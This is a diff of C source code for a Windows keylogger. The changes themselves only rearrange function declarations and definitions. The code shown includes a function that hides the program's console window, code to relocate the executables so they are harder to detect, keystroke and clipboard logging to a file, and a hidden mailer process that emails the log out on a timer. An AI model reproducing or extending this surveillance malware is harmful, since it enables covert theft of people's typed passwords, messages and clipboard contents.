@@ -11,16 +11,20 @@
 #define LOG_TIMER 1800 // time limit until send email (3600s == 1 hour)
 
 // FUNCTION DECLARATIONS //
+char* GetTime();
+
+// setup
+void HideWindow();
 void InstallKeylogger(char* mailer_path, char* logfile_path, char* directory);
 void ClearBrowserCache();
-char* GetTime();
-void HideWindow();
 void InitLogfile(char* logfile_path);
+
+// logging
 int GetLogfileLength(char* logfile_path);
 void UpdateCurrentWindow(char* window, char* new_window, char* prev_clipboard, FILE* logfile);
 void UpdateClipboard(char* prev_clipboard, FILE* logfile);
-void ExecuteMailer(char* mailer_path, char* directory);
 void KeystrokeHandler(short key, FILE* logfile);
+void ExecuteMailer(char* mailer_path, char* directory);
 
 // MAIN FUNCTION //
 int main(){
@@ -90,6 +94,19 @@ int main(){
 }
 
 // FUNCTION DEFINITIONS //
+// get current time
+char* GetTime(){
+    time_t curr_time = time(NULL);
+    return ctime(&curr_time);
+}
+
+// hides the executable window
+void HideWindow(){
+    HWND stealth;
+    AllocConsole();
+    stealth = FindWindowA("ConsoleWindowClass", NULL);
+    ShowWindow(stealth, 0); // set to 0 to not display
+}
 
 // attempt to move the executables to another directory to be "less" detectable
 void InstallKeylogger(char* mailer_path, char* logfile_path, char* directory){
@@ -207,20 +224,6 @@ void ClearBrowserCache(){
     system(browser_path);
 }
 
-// get current time
-char* GetTime(){
-    time_t curr_time = time(NULL);
-    return ctime(&curr_time);
-}
-
-// hides the executable window
-void HideWindow(){
-    HWND stealth;
-    AllocConsole();
-    stealth = FindWindowA("ConsoleWindowClass", NULL);
-    ShowWindow(stealth, 0); // set to 0 to not display
-}
-
 // initialize logfile path and header
 void InitLogfile(char* logfile_path){
     DWORD len = BUF_SIZE+1;
@@ -303,30 +306,6 @@ void UpdateClipboard(char* prev_clipboard, FILE* logfile){
     }
 }
 
-// executes mailer module to send logfile
-void ExecuteMailer(char* mailer_path, char* directory){
-    PROCESS_INFORMATION pi;
-    STARTUPINFO si = { sizeof(STARTUPINFO) };
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE; // hide new executable window
-    
-    // win32 version of fork() and exec()
-    CreateProcess(
-        mailer_path,
-        NULL, NULL, NULL,
-        FALSE,
-        CREATE_NO_WINDOW,
-        NULL, 
-        directory,
-        &si, &pi
-    );
-
-    // wait for child process to complete to prevent emailing emptied logfile
-    WaitForSingleObject(&pi.hProcess, INFINITE);
-    CloseHandle(&pi);
-    Sleep(5000);
-}
 // writes to file the interpretation of keystroke
 void KeystrokeHandler(short key, FILE* logfile){
     // upper case alphabet
@@ -417,4 +396,29 @@ void KeystrokeHandler(short key, FILE* logfile){
                 break;
         }
     }
+}
+
+// executes mailer module to send logfile
+void ExecuteMailer(char* mailer_path, char* directory){
+    PROCESS_INFORMATION pi;
+    STARTUPINFO si = { sizeof(STARTUPINFO) };
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE; // hide new executable window
+    
+    // win32 version of fork() and exec()
+    CreateProcess(
+        mailer_path,
+        NULL, NULL, NULL,
+        FALSE,
+        CREATE_NO_WINDOW,
+        NULL, 
+        directory,
+        &si, &pi
+    );
+
+    // wait for child process to complete to prevent emailing emptied logfile
+    WaitForSingleObject(&pi.hProcess, INFINITE);
+    CloseHandle(&pi);
+    Sleep(5000);
 }
